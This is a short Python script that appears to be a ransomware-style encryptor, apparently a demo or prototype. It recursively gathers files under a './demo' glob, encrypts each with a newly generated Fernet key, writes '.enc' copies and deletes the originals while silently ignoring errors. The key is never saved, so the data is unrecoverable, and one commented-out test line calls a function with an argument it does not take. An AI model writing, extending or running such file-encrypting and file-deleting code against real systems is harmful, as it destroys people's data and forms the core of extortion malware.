import os
import glob
from cryptography.fernet import Fernet


ENCRYPT_GLOBS = [
    './demo/**/*.*'
]
KEY_FILE = 'secret.key'
ENCRYPTED_SUFFIX = '.enc'


def generate_key():
    '''Generate fernet synchronous key'''
    return Fernet.generate_key()


def seek_files(globs):
    '''Search for files in roots with recursive globs and return list of files without duplicates.'''
    files = set()
    for g in globs:
        files |= set( glob.glob(g, recursive=True) )
    return list(files)


def encrypt_files(files, key):
    '''Encrypt the given list of files with fernet and remove the originals'''
    f = Fernet(key)
    for file in files:
        try:
            with open(file, "rb") as in_f:
                data = in_f.read()
            data = f.encrypt(data)
            with open(f'{file}{ENCRYPTED_SUFFIX}', "wb") as out_f:
                out_f.write(data)
            os.remove(file)
        except Exception:
            pass


## Quick tests
# print(seek_files(ENCRYPT_GLOBS))
# generate_key('secret.key')

if __name__ == '__main__':
    key = generate_key()
    files = seek_files(ENCRYPT_GLOBS)
    encrypt_files(files, key)
